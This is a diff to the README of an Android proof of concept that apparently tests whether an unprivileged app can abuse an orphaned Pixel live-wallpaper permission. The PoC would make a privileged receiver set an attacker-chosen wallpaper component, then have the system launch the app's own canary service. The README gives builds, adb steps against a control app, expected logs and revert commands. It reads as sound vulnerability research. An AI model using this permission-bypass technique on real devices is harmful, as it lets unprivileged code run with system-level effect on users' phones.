@@ -45,15 +45,27 @@ So the question this PoC answers is not "can I reach the receiver". It is:
 can an app that holds no real permission make a privileged app perform a
 signature-gated action with an argument of the attacker's choosing.
 
-## Build
+## Three builds
+
+| build | package | has the permission | has a wallpaper service |
+|---|---|---|---|
+| `attacker` | `com.cindrasec.wallpaperpoc` | yes | no |
+| `control`  | `com.cindrasec.wallpaperctl` | no  | no |
+| `canary`   | `com.cindrasec.wallpapercan` | yes | yes |
+
+`attacker` and `control` differ in the permission and nothing else — that pair
+is the measurement. `canary` adds a component, so it is a separate build and
+answers a separate question.
 
 ```sh
-./build.sh both
+./build.sh pair          # attacker + control
+./build.sh canary        # only needed for the escalation step
 ```
 
 Needs the same toolchain as `../mvrp-probe` (JDK, aapt2, d8, apksigner, a
 platform `android.jar` with `resources.arsc`). See that README if a tool is
-missing.
+missing. If d8 dies with an internal error on the canary build, retry it as
+`D8FLAGS=--no-desugaring ./build.sh canary`.
 
 ## Run it, on the latest OS first
 
@@ -73,19 +85,30 @@ Step 1 — the permission really is granted, from the device's own records:
 adb shell dumpsys package com.cindrasec.wallpaperpoc | grep -A20 'install permissions'
 ```
 
-Step 2 — what the wallpaper is before anything is sent:
+Step 2 — pick a target, because this pair of builds carries no wallpaper
+service of its own:
+
+```sh
+adb logcat -c
+adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity --es action list
+adb logcat -d -s WPPOC | tail -20
+```
+
+Choose one that prints `OK` and is not the one currently set. Call it `$T`.
+
+Step 3 — what the wallpaper is before anything is sent:
 
 ```sh
 adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName|Wallpaper component'
 ```
 
-Step 3 — the control first, so a success later cannot be explained by the
+Step 4 — the control first, so a success later cannot be explained by the
 receiver simply being open:
 
 ```sh
 adb logcat -c
 adb shell am start -n com.cindrasec.wallpaperctl/com.cindrasec.wallpaperpoc.MainActivity \
-    --es action set
+    --es action set --es target "$T"
 sleep 3
 adb logcat -d -s WPPOC BroadcastQueue ActivityManager | tail -30
 adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName|Wallpaper component'
@@ -95,36 +118,43 @@ Expected: a `Permission Denial` line naming
 `com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER`, and the
 wallpaper unchanged.
 
-Step 4 — the attacker build, same command, one package name different:
+Step 5 — the attacker build, same command, one package name different:
 
 ```sh
 adb logcat -c
-adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity --es action set
+adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity \
+    --es action set --es target "$T"
 sleep 3
 adb logcat -d -s WPPOC BroadcastQueue ActivityManager | tail -30
 adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName|Wallpaper component'
 ```
 
-The result that would make this a finding: `dumpsys wallpaper` now names
-`com.cindrasec.wallpaperpoc/.CanaryWallpaperService`, and logcat carries
+The result that would make this a finding: `mWallpaperComponent` now names
+`$T`, set by an app holding no permission that entitles it to choose a
+wallpaper component, while the identical app without the orphaned permission
+was refused.
+
+Step 6, only if step 5 worked — the escalation: aim it at the attacker's own
+code instead of something already installed.
+
+```sh
+adb install -r out/canary/com.cindrasec.wallpapercan.apk
+adb logcat -c
+adb shell am start -n com.cindrasec.wallpapercan/com.cindrasec.wallpaperpoc.MainActivity \
+    --es action set
+sleep 3
+adb logcat -d -s WPPOC | tail -20
+adb shell dumpsys wallpaper | grep -iE 'wallpaperComponent|mName'
+```
+
+Looking for:
 
 ```
 WPPOC: canary engine created by the system: uid=... pid=...
 ```
 
-i.e. this app's code was started by the system as the live wallpaper, chosen by
-a caller that holds no permission entitling it to choose one.
-
-Other useful commands:
-
-```sh
-# every wallpaper service on the device, and whether a WallpaperInfo parses
-adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity --es action list
-
-# point at some other installed wallpaper service instead of the canary
-adb shell am start -n com.cindrasec.wallpaperpoc/.MainActivity \
-    --es action set --es target 'pkg/cls'
-```
+i.e. the unprivileged app's own code started by the system as the live
+wallpaper.
 
 ## Reverting
 
@@ -134,6 +164,7 @@ Pick any wallpaper in Settings, or:
 adb shell am start -a android.intent.action.SET_WALLPAPER
 adb uninstall com.cindrasec.wallpaperpoc
 adb uninstall com.cindrasec.wallpaperctl
+adb uninstall com.cindrasec.wallpapercan
 ```
 
 ## What would kill this
